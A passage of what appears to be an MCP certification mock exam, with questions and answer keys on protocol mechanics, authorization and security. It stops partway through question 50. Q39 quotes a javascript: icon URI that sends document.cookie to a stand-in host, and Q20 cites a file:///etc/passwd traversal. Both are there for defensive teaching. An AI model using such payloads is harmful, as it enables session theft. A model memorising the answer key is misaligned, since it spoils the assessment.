# MCPA 모의고사 01: MCPA Full-Length Mock 1: Operational Scenarios

> 실제 시험 문항이 아니며 출제 내용을 보장하지 않는다. 리눅스 재단(Linux Foundation)과 AAIF의 공식 자료가 아니다.

원본: rohitg00/ai-engineering-from-scratch `certifications/mcpa/assessments/mcpa-f/mock-01.json` (버전 1). 제한 시간 90분, 60문항.

도메인별 문항 수: mcp-fundamentals 10, architecture-and-components 8, interactions-and-execution 16, security-and-governance 14, use-cases-and-ecosystem 12. 유형: single 50, multiple 10.

## 1. [mcp-fundamentals]

A platform team currently maintains a separate hand-written connector between each of six internal applications and nine external systems, and the number of connectors keeps growing as new applications and systems are added. Leadership asks whether adopting one shared protocol like MCP for context and tool access would help. What is the strongest justification?

A. MCP turns the multiplicative growth of custom connectors into an additive one across compliant applications and systems\
B. MCP replaces the need for any authorization or consent step between an application and the systems it reaches\
C. MCP guarantees every external system will expose identical data regardless of what that system actually stores\
D. MCP removes the need for the team to ever choose which specific large language model an application uses internally today

<details><summary>정답</summary>

A. MCP standardizes the integration surface between AI applications and external systems, so growth changes from roughly the count of applications times systems to roughly their sum. It does not choose models, guarantee identical data, or remove authorization requirements.

</details>

## 2. [mcp-fundamentals]

A support engineer who is new to the team tells a colleague that every MCP exchange must open with an initialize request before the server will accept any other call. The colleague is reviewing the 2026-07-28 specification. How should the colleague respond?

A. Agree, because initialize still creates the shared session that every later request in the exchange truly depends on\
B. Explain that initialize and sessions were removed, since every request now carries its own version and capabilities\
C. Agree, but note that only remote HTTP servers still require the complete initialize handshake today\
D. Explain that initialize is now considered fully optional but still returns a session id for later calls

<details><summary>정답</summary>

B. The 2026-07-28 revision removed the initialize request and notifications/initialized along with protocol sessions. Every request instead carries protocolVersion, clientCapabilities, and related fields in its own per-request metadata, so no handshake or session is required.

</details>

## 3. [mcp-fundamentals]

A team is deciding whether it is still safe to rely on the roots feature in a client they are building. One engineer says the feature was removed in 2026-07-28 and must be deleted immediately. Another checks the deprecated features registry. What does the registry actually show for a deprecated feature like roots?

A. It is undocumented, so the team must simply guess its status from forum posts\
B. It is Active and considered fully current, so no change is required for years right now\
C. It is Deprecated, still functional, with a migration path and an earliest removal date\
D. It is Removed already, so any client code that calls it will fail immediately

<details><summary>정답</summary>

C. The feature lifecycle keeps a deprecated feature specified and working, with a required migration path and a minimum window before removal is even possible. Confusing deprecated with removed causes teams to delete working integrations too early.

</details>

## 4. [mcp-fundamentals]

An operator scales a remote MCP server from one replica to three behind a load balancer with no sticky routing. A tool that kept a per-client running total in process memory starts returning totals that jump around between calls. What is the root cause?

A. The load balancer is rewriting JSON-RPC ids, so results get matched to the wrong calls\
B. The client stopped declaring capabilities after its first call, so later replicas ignore it\
C. Each replica negotiates its own protocol version, so replicas disagree on the result format\
D. The total lived in one replica's memory, so replicas that never saw it cannot continue it

<details><summary>정답</summary>

D. Under the stateless core every request must be answerable from its own contents plus any explicit handle it names, so state that spans calls belongs behind a server-minted handle backed by shared storage, not in one replica's memory. Once requests spread across replicas, implicit per-client memory is invisible to the replicas that did not create it, which is exactly the drift the operator sees.

</details>

## 5. [mcp-fundamentals]

A developer who previously built JSON-RPC batch clients wants to send several tool calls in one HTTP POST body to a 2026-07-28 server to save round trips. What should the developer expect?

A. The request is rejected, since batching was removed and each POST body now carries exactly one request\
B. The server processes only the first call in the array and silently drops the rest\
C. The server happily accepts the whole batch and answers each call inside one large combined result array\
D. The server queues the extra calls and answers them one at a time over minutes

<details><summary>정답</summary>

A. JSON-RPC batching was removed from MCP in the 2025-06-18 revision and remains absent in 2026-07-28, so a Streamable HTTP POST body must contain exactly one JSON-RPC request or notification rather than an array of several.

</details>

## 6. [mcp-fundamentals]

A new teammate asks how a host relates to the clients and servers it works with. Which description matches the 2026-07-28 architecture?

A. The host is a single client that multiplexes every server connection over one shared common channel\
B. The host embeds one client per server connection, and each client talks to exactly one server\
C. Each server embeds its own client to reach the host directly\
D. Clients and servers connect to each other directly, with the host present only for billing

<details><summary>정답</summary>

B. A host application embeds one client instance per server connection, so each client maintains a one to one relationship with a single server while the host coordinates the overall set of connections and aggregates their results for the model.

</details>

## 7. [mcp-fundamentals]

A vendor proposes that the company build one bespoke SDK per partner system instead of adopting MCP, arguing that a shared protocol adds unnecessary abstraction. What is the strongest counterpoint grounded in interoperability?

A. A shared protocol means partner systems no longer need to publish any documentation at all\
B. A shared protocol removes the need to ever negotiate a protocol version again\
C. A shared protocol lets any compliant client use any compliant server without system-specific glue code\
D. A shared protocol supposedly guarantees every single partner system will have identical performance results

<details><summary>정답</summary>

C. The value of one open protocol is that discovery and capability negotiation are data rather than code, so a client built once can work with any conforming server. It does not equalize performance, remove version negotiation, or replace documentation.

</details>

## 8. [mcp-fundamentals] (복수 정답)

An architecture review is listing the real benefits of adopting one open protocol like MCP instead of custom point-to-point integrations. Which two statements are accurate? Select two.

A. The specific model that the host application uses internally no longer needs to be chosen or configured at all\
B. Every server automatically inherits the exact same user interface as every other connected server today\
C. Any modern client can use any modern server without integration-specific code, because discovery is expressed as data\
D. Growth in the number of connectors becomes additive across applications and systems instead of multiplicative

<details><summary>정답</summary>

C, D. Standardizing the wire between applications and systems lets a client discover and use any compliant server without bespoke glue code, turning multiplicative integration growth into additive growth. MCP does not standardize user interfaces or choose which model a host runs.

</details>

## 9. [mcp-fundamentals]

While reading a changelog entry for the 2026-07-28 revision, an engineer sees a line that references a specific SEP number and a short headline. What is the correct way to use that entry to judge whether a feature is safe to build against today?

A. Ignore the changelog entirely and rely only on the previous revision's own documentation\
B. Treat the changelog headline alone as fully sufficient, since SEP numbers are only historical trivia anyway\
C. Assume every single changelog entry describes a feature that is now already removed\
D. Look up the referenced SEP and the current specification page to confirm the feature's lifecycle stage

<details><summary>정답</summary>

D. A changelog entry names what changed and links to the proposal that drove it, but the authoritative status of a feature is its current lifecycle stage on the specification and deprecated-features pages, which the reader should confirm directly rather than guessing from the headline.

</details>

## 10. [mcp-fundamentals] (복수 정답)

A team is documenting why their MCP server design keeps every request self-contained instead of relying on connection state. Which two consequences follow from that stateless design? Select two.

A. Any replica behind a load balancer can correctly answer any incoming request\
B. The server can skip declaring resultType because the connection already establishes what kind of answer to expect\
C. A dropped and retried request can be routed to a different server instance without breaking correctness\
D. The server may safely infer a client's identity from an earlier request on the same connection

<details><summary>정답</summary>

A, C. Because no information may carry over from a prior request on the same connection, any replica can serve any request and a retry is safe to route anywhere, which is exactly why load balancers need no stickiness under the stateless core.

</details>

## 11. [architecture-and-components]

A client sends a tools/call request for a tool whose description says it may ask the user follow-up questions, but the client's request never declared the elicitation capability. What should the server do?

A. Answer with a MissingRequiredClientCapability error naming the capability the client must declare\
B. Silently downgrade the entire tool call to a safer read-only variant instead\
C. Cache the request indefinitely until the client eventually declares the missing capability itself\
D. Proceed anyway regardless, since capability declarations are only a minor formality

<details><summary>정답</summary>

A. A server must not rely on a capability the client did not declare on that specific request, so when it needs elicitation and the request lacks that capability, it returns the MissingRequiredClientCapability error with the required capabilities listed in the error data.

</details>

## 12. [architecture-and-components]

A tool defines an outputSchema describing a structured invoice object. A client calls the tool and receives a result with structuredContent that does not match that schema. What does this indicate about the server's implementation?

A. The client must have sent an incorrectly formed inputSchema along with the original call\
B. The server violated its own contract, since structuredContent must conform to a declared outputSchema\
C. Nothing at all, because outputSchema is only decorative and is never checked against the actual result\
D. The mismatch is expected whenever a tool also happens to return a text content block

<details><summary>정답</summary>

B. When a tool declares an outputSchema, any structuredContent the server returns must conform to it, and the server should also serialize the same data into a text block for compatibility. A mismatch is a defect in the server's tool implementation, not a client error.

</details>

## 13. [architecture-and-components]

A manifest reviewer sees a tool definition whose name is get_forecast and whose title is Get 7-Day Forecast. Which field must a client send as params.name when it calls this tool, and what is the other field for?

A. Neither one, since tools/call identifies a tool by its position in the tools/list array\
B. title in params.name, since title is the canonical identifier and name is a display hint\
C. name in params.name, since name is the programmatic identifier and title is for display\
D. Either one, since servers resolve a call by matching name and title interchangeably

<details><summary>정답</summary>

C. Tool metadata separates a programmatic name, which clients send in params.name on tools/call, from an optional human-readable title that hosts show in their user interfaces. Calling by title, or by position in the list, breaks as soon as the display text or the ordering changes.

</details>

## 14. [architecture-and-components]

In the model interaction flow, a host is about to let the model call a tool annotated as destructive. Where does the host's confirmation step belong in that flow?

A. Only inside the server, since the host has no visibility into tool annotations\
B. Inside the model's own hidden reasoning, invisible to the host\
C. After the server has already executed the tool, as a post-hoc notice\
D. Before the client sends tools/call, so a human can approve or deny the action

<details><summary>정답</summary>

D. The interaction flow places human confirmation of sensitive calls before the client actually sends the request, so a destructive action can be denied rather than merely logged afterward. The host reads the tool's annotations and inputs to decide whether to prompt.

</details>

## 15. [architecture-and-components]

A platform team runs one MCP server locally over stdio for filesystem access and a second MCP server remotely over Streamable HTTP for a SaaS integration. A reviewer claims both servers share one trust boundary because the host treats them the same way in its tool registry. What is the correct correction?

A. The trust boundary follows the process and network boundary, so the two servers sit in different trust domains\
B. Trust boundaries are set entirely by which capabilities a server declares in its discover result\
C. Both servers share one trust boundary as long as they expose tools with different names\
D. Only the remote HTTP server has a real trust boundary, since a local subprocess is inherently trusted

<details><summary>정답</summary>

A. Trust domains follow process and network boundaries rather than how a host happens to list tools, so a local stdio subprocess and a remote HTTP service are separate trust domains even when the host aggregates both into one registry. Naming and declared capabilities do not redraw that boundary.

</details>

## 16. [architecture-and-components] (복수 정답)

A client is deciding when it must call server/discover before using a server. Which two statements about discovery are correct? Select two.

A. Servers may entirely skip implementing server/discover whenever they only expose a single simple tool overall\
B. Calling server/discover is optional for a client, since it may send a request directly and handle a version error\
C. A DiscoverResult must always be answered before any other kind of request is allowed to be sent at all\
D. The instructions field returned by discover is natural-language guidance for the model, not a machine-checked contract

<details><summary>정답</summary>

B, D. Discovery is optional for clients but mandatory for servers to implement, and a DiscoverResult's instructions field is descriptive guidance for the model rather than an enforced contract. No request ordering requires discover to run first, and skipping it is never conditioned on a server's tool count.

</details>

## 17. [architecture-and-components]

A tool's inputSchema has no $schema keyword at all, and the client team's validator library defaults to an older JSON Schema draft. Which dialect should the client apply when validating arguments against this schema?

A. Whatever dialect the validator library defaults to, since MCP leaves the choice open\
B. JSON Schema 2020-12, since MCP makes it the default dialect when $schema is absent\
C. Draft-04, since it remains the most widely deployed JSON Schema dialect in libraries\
D. Draft-07, since most early MCP servers were written against that particular draft

<details><summary>정답</summary>

B. MCP schemas default to the JSON Schema 2020-12 dialect when they carry no $schema keyword, so a validator must apply 2020-12 semantics instead of its own library default or an older draft. A schema that needs another dialect has to declare it explicitly with $schema.

</details>

## 18. [architecture-and-components]

A host rebuilds its tool list for the model on every turn, but the order of tools within that list changes randomly each time based on dictionary iteration order in the host's own code. A teammate says this is harmless. Why is it actually a problem?

A. It is a problem only because JSON object keys are technically unordered in the specification\
B. It is a problem only because the model refuses to call any tool that is not listed first\
C. tools/list results should be deterministically ordered, and random ordering defeats client and LLM prompt-cache hits\
D. It is not a problem, since tool order has no effect on caching or on anything the model does

<details><summary>정답</summary>

C. Tool listings should be deterministically ordered so that client-side caching and the model provider's own prompt caching can recognize a stable, repeated prefix. Randomizing the order breaks that stability even though the set of tools and their definitions have not actually changed.

</details>

## 19. [interactions-and-execution]

A tool's result needs to hand back an image the model should reason about plus a pointer to a large log file the model should not have to read in full. Which combination of content blocks fits both needs?

A. Two text blocks, one describing the image and one describing the log file\
B. An audio content block for the image and a text block for the log file\
C. A single embedded resource block containing both the image bytes and the entire log file text\
D. An image content block for the picture, plus a resource_link pointing at the log file

<details><summary>정답</summary>

D. An image content block carries visual data the model can reason about directly, while a resource_link gives the model a reference to a resource, such as a large file, without forcing its full content into context. Using audio for an image would misrepresent the content type.

</details>

## 20. [interactions-and-execution]

An MCP server exposes internal documents through file:// resource URIs. A security reviewer worries this lets a crafted URI like file:///etc/passwd walk outside the intended document tree. What must a compliant server do about this?

A. Sanitize file paths to prevent directory traversal, a check the specification requires of servers\
B. Nothing, since the file:// scheme is only ever reachable by already-trusted local clients\
C. Reject file:// entirely, since 2026-07-28 only permits https:// and git:// resource URIs\
D. Allow it, since resources/read already restricts every caller to their own home directory

<details><summary>정답</summary>

A. The resources specification requires servers to validate every resource URI and to sanitize file paths to prevent directory traversal attacks. A file:// URI need not map to a physical filesystem at all, but when it does, the server owns the check before any path touches disk, rather than trusting the caller or the transport.

</details>

## 21. [interactions-and-execution]

A client calls prompts/get for a real prompt name but omits an argument the prompt declares as required. What should the server return?

A. A successful PromptMessage list with the missing argument left as an empty string\
B. A JSON-RPC error with code -32602 for the missing required argument\
C. A tool execution error with isError true, since prompts share the tools error channel\
D. A JSON-RPC error with code -32601, since the prompt itself could not be found

<details><summary>정답</summary>

B. Both an invalid prompt name and a missing required argument are protocol errors coded -32602 under the current allocation, distinct from the tool execution error channel that applies to tools, and distinct from -32601 which means the method itself is unrecognized.

</details>

## 22. [interactions-and-execution]

A deploy tool needs the user to confirm a risky action before it proceeds. Under the 2026-07-28 message patterns, how does the server ask for that confirmation?

A. It opens a brand-new subscriptions/listen stream and waits there for the user's eventual final answer\
B. It simply pauses the response indefinitely until the user answers somehow out of band\
C. It returns a result with resultType input_required, carrying inputRequests or requestState to answer\
D. It sends a brand-new server-initiated request straight to the client mid-call

<details><summary>정답</summary>

C. Multi round-trip requests replaced server-initiated requests entirely, so a server that needs input answers the original call with an input_required result carrying at least one of inputRequests or requestState, which the client answers by retrying the same logical request with a new id.

</details>

## 23. [interactions-and-execution]

A server currently asks the client to run a completion through the client's own model using sampling create message. A migration review flags this as deprecated. What is the recommended replacement?

A. Keep using it forever, since deprecated features never actually change\
B. Replace it with roots/list, since roots and sampling share the same migration path\
C. Replace it with subscriptions/listen so the client streams the completion as resource updates\
D. Switch the server to call an LLM provider's API directly rather than through the client

<details><summary>정답</summary>

D. Sampling is deprecated in 2026-07-28, and its documented migration is for the server to call a large language model provider's API directly rather than asking the client to run a completion on its behalf. It remains functional but is not the forward path.

</details>

## 24. [interactions-and-execution]

An MCP client's stdio connection to a server crashes partway through a conversation, and the client automatically restarts the server subprocess. Before the crash, the client had an active subscriptions/listen stream watching for tool list changes. What must the client do after the restart to keep receiving those notifications?

A. Re-send a new subscriptions/listen request, since the previous stream did not survive the crash and restart\
B. Nothing, since the server automatically remembers and resumes the previous listen stream on its own\
C. Send notifications/cancelled first, since that is what reopens a listen stream after a crash\
D. Wait for the server to proactively re-establish the stream using the old subscriptionId value

<details><summary>정답</summary>

A. A stdio subprocess restart discards whatever the previous process was tracking, including an open listen stream, so the client is responsible for re-issuing subscriptions/listen after it restarts the server, the same way it retries other lost requests rather than waiting on the server to reconnect on its own.

</details>

## 25. [interactions-and-execution]

An operator debugging a failed tool call sees a JSON-RPC error with code -32602 rather than a result with isError true. Which situation matches that response shape?

A. The arguments were well formed but failed a business rule enforced by the tool's own logic\
B. The request named a tool that does not exist on this server\
C. An external API the tool depends on returned a failure\
D. The arguments failed validation against the tool's declared inputSchema

<details><summary>정답</summary>

B. An unknown tool name is a protocol-level failure returned as a JSON-RPC error coded -32602, while schema-invalid arguments, business rule rejections, and downstream API failures are all represented as tool execution errors, a normal result with isError true, so the model can see and react to them.

</details>

## 26. [interactions-and-execution]

A code reviewer sees a pull request that returns a JSON-RPC -32602 error whenever a tool's arguments fail a business rule, such as a discount percentage over the allowed maximum. What should the reviewer flag?

A. That the code should use -32002, since that is the correct code for invalid business input\
B. That the code should use -32601 instead, since the tool method itself is unknown\
C. That business rule failures should instead be a tool execution error with isError true\
D. Nothing, since business rule violations are exactly what -32602 exists for

<details><summary>정답</summary>

C. Input validation and business logic failures are tool execution errors returned as a normal result with isError true, not JSON-RPC protocol errors, because that channel lets the failure content flow back into the model's context so it can adjust its arguments.

</details>

## 27. [interactions-and-execution]

A gateway in front of several MCP servers receives a POST whose MCP-Protocol-Version header does not match the protocolVersion value inside the request's metadata. What should the gateway do?

A. Ignore the header and trust only the value inside the request body\
B. Silently rewrite the header to match the body before forwarding it\
C. Forward the request as is, since headers are advisory hints only\
D. Reject the request with HTTP 400 and the HeaderMismatch error code

<details><summary>정답</summary>

D. Streamable HTTP requires the MCP-Protocol-Version header to equal the version carried in the request metadata, and a disagreement between the header and the body is exactly the condition the HeaderMismatch error exists to report, returned as HTTP 400 with JSON-RPC code -32020.

</details>

## 28. [interactions-and-execution] (복수 정답)

A host developer is deciding what to cache from a slow-changing MCP server to cut latency for the agent's next turn. Which two practices match the 2026-07-28 caching model? Select two.

A. Invalidate a cached list immediately on receiving the matching list_changed notification rather than waiting out the ttlMs\
B. Cache an input_required result the same way as any other complete result, since it saves a round trip\
C. Treat cacheScope public as proof that the data is safe to show to any user, regardless of what the request required\
D. Partition private cacheScope entries by authorization context so cached results never cross between users

<details><summary>정답</summary>

A, D. Private cache entries must never cross authorization contexts, and a list_changed notification invalidates a cached list immediately regardless of its remaining ttlMs, since ttlMs is only a freshness hint. cacheScope is never an access control, and MRTR input_required results are never cached.

</details>

## 29. [interactions-and-execution]

A team is building a report-generation tool that can take anywhere from a few seconds to twenty minutes depending on the report size, and the client may disconnect and reconnect during that time. Which approach fits best?

A. Return the report through the tasks extension, so the client can poll and reconnect using a taskId\
B. Use a server-minted handle and have the client poll resources/read on a fixed schedule\
C. Use MRTR and treat the entire twenty-minute wait as one input_required round trip\
D. Always answer with a plain complete result and let the HTTP connection stay open for twenty minutes

<details><summary>정답</summary>

A. Long, unpredictable work that must survive disconnection is exactly what the tasks extension is for: the server answers with a task result carrying a taskId, and the client polls tasks/get and can resume tracking it after a reconnect, unlike a single held-open response or an MRTR round trip meant for one input exchange.

</details>

## 30. [interactions-and-execution]

An operator sees a tool call that was cancelled by the client, but a late result for that same call arrives from the server moments later. What is the correct handling?

A. Retry the same request id to force the server to resend the cancellation acknowledgment\
B. Discard the late result, since races after cancellation are expected and should be ignored\
C. Reject the entire connection, since a late result after cancellation means the server is broken\
D. Treat the late result as authoritative and apply it as if cancellation never happened

<details><summary>정답</summary>

B. Cancellation is inherently racy: a response can be in flight when the cancellation is sent, so a late response to an already-cancelled request is expected and should simply be ignored rather than applied, escalated as a defect, or retried under the same id.

</details>

## 31. [interactions-and-execution]

A server returns an InputRequiredResult whose inputRequests map uses the keys confirm_deploy and pick_region, with no requestState. How must the client shape its retry of the original tools/call?

A. Send inputResponses under keys of the client's choosing, plus an empty requestState string\
B. Send only the answer to the first key, since a server asks one question per round trip\
C. Send inputResponses under the same two keys the server chose, and omit requestState\
D. Send the answers in a new elicitation/create request instead of retrying the original call

<details><summary>정답</summary>

C. The retry repeats the original request with a new id and adds inputResponses under exactly the keys the server chose in inputRequests, so the server can match each answer to its question. requestState is echoed only when the server supplied one; a client must not invent it or send an empty value.

</details>

## 32. [interactions-and-execution]

A team is migrating a legacy server that still expects an initialize handshake to the 2026-07-28 wire format. During the transition, a dual-era client sends a modern request directly over stdio and the server responds with something other than a DiscoverResult or a recognized modern error. What should the client conclude?

A. The server is modern but temporarily overloaded, so the client should keep retrying the same request\
B. The server must have crashed, so the client should restart the subprocess immediately\
C. The server rejected the specific protocol version, so the client should retry using the supported list\
D. The server is legacy, so the client should fall back to the initialize handshake

<details><summary>정답</summary>

D. On stdio, an unrecognized error or a timeout in response to a modern probe means the server is legacy and the client should fall back to the initialize handshake, while a recognized modern error such as UnsupportedProtocolVersion would instead mean modern with a different version, never a blind fallback keyed on one code.

</details>

## 33. [interactions-and-execution] (복수 정답)

A gateway operator is configuring which HTTP headers must be present on every request POSTed to a 2026-07-28 MCP endpoint. Which two headers are required by the specification? Select two.

A. Mcp-Session-Id, to keep requests bound to the same session\
B. MCP-Protocol-Version, matching the version carried in the request's metadata\
C. Mcp-Method, naming the JSON-RPC method the request carries\
D. Last-Event-ID, to support resuming a dropped stream

<details><summary>정답</summary>

B, C. Streamable HTTP requires MCP-Protocol-Version on every request, matching the version in the request's metadata, and Mcp-Method naming the request's method so intermediaries can route without parsing the body. Mcp-Session-Id and Last-Event-ID belonged to the removed session and stream-resumability mechanisms and no longer apply.

</details>

## 34. [interactions-and-execution] (복수 정답)

A team reviewing the tasks extension wants to confirm which statuses a task can report while the client polls tasks/get. Which two are real statuses in the 2026-07-28 design? Select two.

A. cancelled, used when a cooperative tasks/cancel request succeeded\
B. input_required, used when the task needs an answer before it can continue\
C. queued_for_review, used whenever a human must approve the task before it starts\
D. retrying, used automatically whenever the underlying tool call throws an exception

<details><summary>정답</summary>

A, B. The tasks extension defines the statuses working, input_required, completed, failed, and cancelled, so a task can pause for mid-flight input or end because a cooperative cancel request succeeded. There is no separate queued_for_review or automatic retrying status in the redesigned extension.

</details>

## 35. [security-and-governance]

A host offers one-click setup: a user pastes a configuration snippet from a web page, and the host can start the local stdio server it describes. What must the host do before it runs that server's command?

A. Show the exact command untruncated, flag it as code execution, and require explicit approval\
B. Run the command in the model's sandbox, since the model recommended the configuration\
C. Ask the server for its serverInfo first, and run it only if the reported name looks legitimate\
D. Run the command at once, since a local stdio server sits inside the host's own trust zone

<details><summary>정답</summary>

A. One-click local configuration executes code on the user's machine, so the specification's security guidance requires the client to show the exact command without truncation, identify it as a potentially dangerous operation, require explicit approval, and let the user cancel. Being local does not make a pasted command trustworthy, and self-reported serverInfo proves nothing about it.

</details>

## 36. [security-and-governance]

A client calls an MCP server over HTTP without a token and receives a 401 response. How is the client expected to discover which authorization server issues tokens for this resource?

A. By asking the end user to paste in the authorization server's URL from memory\
B. By reading the WWW-Authenticate header's resource_metadata value or the well-known metadata paths\
C. By reading the server's self-reported serverInfo field returned from the server/discover call instead\
D. By simply guessing common authorization server domains until one finally accepts the client

<details><summary>정답</summary>

B. A 401 response should carry a WWW-Authenticate challenge with a resource_metadata value, or the client falls back to the well-known Protected Resource Metadata paths, both of which point at Protected Resource Metadata naming the authorization servers, rather than relying on guesses or self-reported serverInfo.

</details>

## 37. [security-and-governance]

A command-line MCP client meets an authorization server that does not advertise Client ID Metadata Document support, so it falls back to Dynamic Client Registration with a localhost redirect URI. Which application_type must its registration request carry?

A. service, since command-line tools register as unattended machine-to-machine clients\
B. web, since every OAuth client that completes a browser redirect counts as a web application\
C. native, since desktop, command-line, and localhost clients register as native applications\
D. none, since application_type is optional metadata that authorization servers ignore

<details><summary>정답</summary>

C. A client that falls back to Dynamic Client Registration must send application_type: native for desktop, command-line, and localhost clients, and web for remote browser-based clients, so the authorization server applies the right redirect URI rules. Dynamic Client Registration is itself deprecated in favor of Client ID Metadata Documents but remains the fallback when those are not advertised.

</details>

## 38. [security-and-governance]

A user approves a destructive delete_record tool call after reviewing its arguments. Moments later in the same turn, the model wants to call a different destructive tool, archive_record. Does the earlier approval cover this new call?

A. Yes, since one destructive-tool approval covers every destructive tool for the rest of the turn\
B. Yes, but only because both tool names share a common record-related prefix\
C. No, but only because archive_record happens to have a longer name than delete_record\
D. No, each sensitive tool call needs its own consent, so approving one destructive tool does not approve another

<details><summary>정답</summary>

D. Consent is scoped per invocation rather than granted blanket for a session, so approving one destructive call does not extend to a different tool even later in the same turn. Shared naming or relative name length have no bearing on whether consent transfers between tools.

</details>

## 39. [security-and-governance]

A security owner reviewing a new server finds a tool whose icons entry has src set to javascript:fetch('https://collect.example/'+document.cookie). What must a client that renders icons do with this icon?

A. Reject it, since icon URIs must be HTTPS or data: and unsafe schemes such as javascript: are refused\
B. Render it, since icons are cosmetic metadata that never execute inside a host's interface\
C. Render it only after the model confirms the icon matches the tool's stated purpose\
D. Rewrite the javascript: scheme to https: automatically and then fetch the new address

<details><summary>정답</summary>

A. Icon metadata is untrusted server input. The specification requires consumers to accept only HTTPS or data: icon URIs, to reject unsafe schemes and redirects such as javascript:, and to treat fetched payloads such as SVG as potentially executable. Rewriting the scheme or asking the model does not make an attacker-controlled URI safe.

</details>

## 40. [security-and-governance]

An incident review needs to trace one failed tool call across the host, the client, and the server that executed it. What mechanism is designed to carry that correlation across the hops?

A. The JSON-RPC id, since request ids are guaranteed unique across the entire system forever\
B. OpenTelemetry trace context carried in request metadata as traceparent, tracestate, and baggage\
C. The clientInfo field, since it is always self-reported by the client on every single outgoing request\
D. The cacheScope field, since it supposedly labels which requests belong to the same trace

<details><summary>정답</summary>

B. W3C Trace Context and Baggage fields travel in request metadata as traceparent, tracestate, and baggage specifically so a request can be correlated across host, client, server, and upstream hops, unlike clientInfo which is display only or cacheScope which governs caching, not tracing.

</details>

## 41. [security-and-governance]

A server that the organization has not vetted lists a tool whose annotations claim readOnlyHint true and destructiveHint false. Should a host let the model skip its usual confirmation step for that tool based on those annotations alone?

A. No, but only because destructiveHint defaults to false and cannot be overridden\
B. Yes, because annotations are enforced guarantees the server cannot misreport\
C. No, annotations are hints and must be treated as untrusted unless the server is trusted\
D. Yes, but only if the annotations were also repeated inside the tool's own description text

<details><summary>정답</summary>

C. Tool annotations are hints, not enforced guarantees, and must be treated as untrusted input unless the server providing them is itself trusted, so a host should not waive its confirmation step for an unvetted server purely because the annotations look reassuring.

</details>

## 42. [security-and-governance]

A user clicks Authorize and is redirected back with an authorization response, but the issuer named in that response does not match the issuer the client recorded before redirecting. What must the client do?

A. Accept the response, but only after normalizing both issuer strings to lowercase first\
B. Accept the response, since the authorization code itself is proof enough of a valid issuer\
C. Accept the response anyway, since the issuer only matters for error responses, not successful ones\
D. Reject the response as a mismatch, even though the rest of the exchange otherwise looks successful

<details><summary>정답</summary>

D. Issuer validation defends against mix-up attacks: the client records the expected issuer before redirecting and compares the returned issuer exactly, with no normalization, rejecting any mismatch including on responses that otherwise look like success, since a valid-looking code from the wrong issuer is exactly the attack this check catches.

</details>

## 43. [security-and-governance]

A server exposes a tool that calls an expensive external search API. Without any limits, a single misbehaving client could exhaust the server's quota for every other user. What control most directly addresses this?

A. Per-tool rate limiting on the server side, independent of what the client claims to need\
B. Moving the rate limit into the tool's own description text as an instruction to the model\
C. Increasing the tool's timeout so retries happen less often\
D. Relying on the client's own idempotentHint declaration to slow down repeated calls

<details><summary>정답</summary>

A. Servers are expected to enforce their own rate limits regardless of what a client declares, since a client-side hint or a longer timeout does nothing to stop a determined or buggy caller, and a limit written only into a description is advisory text the model may ignore.

</details>

## 44. [security-and-governance]

A team is designing its audit logging for MCP tool calls. A reviewer objects that the draft design logs the full raw arguments of every call, including free-text fields a user might paste sensitive data into. What should the design change to?

A. Stop logging arguments at all, so the audit trail only records that some call happened\
B. Redact or omit sensitive argument content so audit records never carry credentials, secrets, or personal data\
C. Encrypt the arguments with a key stored next to the log, so any reader can decrypt them\
D. Log the full raw arguments anyway, since audit completeness always fully outweighs any data sensitivity concerns

<details><summary>정답</summary>

B. Audit and observability practice requires that logs never contain credentials, secrets, or personal data, so sensitive argument content should be redacted or omitted while still preserving enough structure, such as method, tool name, and correlation ids, to support tracing and attribution.

</details>

## 45. [security-and-governance]

An MCP proxy uses one static client id when talking to third-party authorization servers on behalf of many different downstream clients. What additional step does this design require to avoid a confused deputy problem?

A. The proxy should stop validating redirect URIs, since the static client id already vouches for them\
B. The proxy should reuse the same authorization code across all downstream clients to simplify the flow\
C. The proxy must obtain user consent for each dynamically registered client before forwarding it onward\
D. None, since a single static client id already isolates each downstream client automatically

<details><summary>정답</summary>

C. A proxy that presents one static client id to an authorization server on behalf of many dynamically registered clients must obtain explicit user consent for each one before forwarding, since without that step the authorization server cannot distinguish which downstream client is actually acting.

</details>

## 46. [security-and-governance]

A workflow only needs to read a customer's order history, but the team is about to grant it a scope that also allows placing and cancelling orders. What principle should push back on that request?

A. Statelessness, since order history is state that clearly spans multiple requests\
B. Cache scope, since public and private caching require entirely different access permissions\
C. Idempotency, since placing a new order is not an idempotent operation at all\
D. Least privilege, since the workflow should be granted only the access its task requires

<details><summary>정답</summary>

D. Least privilege means granting only the access a task actually needs, so a read-only history workflow should receive a read-only scope rather than a broader one that also allows placing or cancelling orders, independent of idempotency, statelessness, or caching considerations that do not bear on this decision.

</details>

## 47. [security-and-governance] (복수 정답)

A policy engine is scoring a candidate server for known MCP attack surfaces before it is approved. Which three are real threats the engine should score for? Select three.

A. Cache staleness, where a ttlMs value of zero simply means a result is treated as stale immediately\
B. Tool poisoning through a description that contains hidden instructions aimed at the model\
C. Confused deputy behavior in a proxy that forwards to a third-party authorization server using one static client id\
D. Rug pulls, where a previously approved tool's definition silently changes after approval

<details><summary>정답</summary>

B, C, D. Tool poisoning, rug pulls, and confused deputy proxy behavior are documented threats with specific mitigations such as output sanitization, definition pinning, and per-client consent. A ttlMs of zero simply means the result is treated as stale immediately, which is a caching detail rather than a security threat.

</details>

## 48. [security-and-governance] (복수 정답)

A team is checking their MCP client's OAuth implementation against the 2026-07-28 authorization requirements. Which three practices are actually required? Select three.

A. Send the bearer token in the Authorization header on every HTTP request, never in the query string\
B. Send the resource parameter identifying the canonical server URI on both the authorization and token requests\
C. Use PKCE with S256 when the client is capable of it\
D. Store a long-lived refresh token locally and assume one will always be issued

<details><summary>정답</summary>

A, B, C. Bearer tokens belong only in the Authorization header, PKCE with S256 is mandatory when supported, and Resource Indicators must be sent on both the authorization and token requests. A refresh token should never be assumed, since public clients' refresh tokens rotate and one may not be issued at all.

</details>

## 49. [use-cases-and-ecosystem]

A team is drawing a responsibility matrix for a new remote MCP deployment. Who is the right owner for implementing Protected Resource Metadata and validating token audience?

A. The server author, since these are requirements on the resource server itself\
B. The registry publisher, since Protected Resource Metadata is part of server.json\
C. The end user, since they are the one granting consent\
D. The gateway operator only, and never the server author

<details><summary>정답</summary>

A. Protected Resource Metadata and audience validation are requirements on the MCP server acting as an OAuth resource server, so the server author owns implementing them, distinct from the end user's consent role, the registry publisher's metadata role, or a gateway operator who may add further enforcement but does not replace this duty.

</details>

## 50. [use-cases-and-ecosystem]

A team exposes a prompt that takes a repository argument, and users keep mistyping repository names in the host's form. Which MCP capability lets the host suggest valid values while the user types?

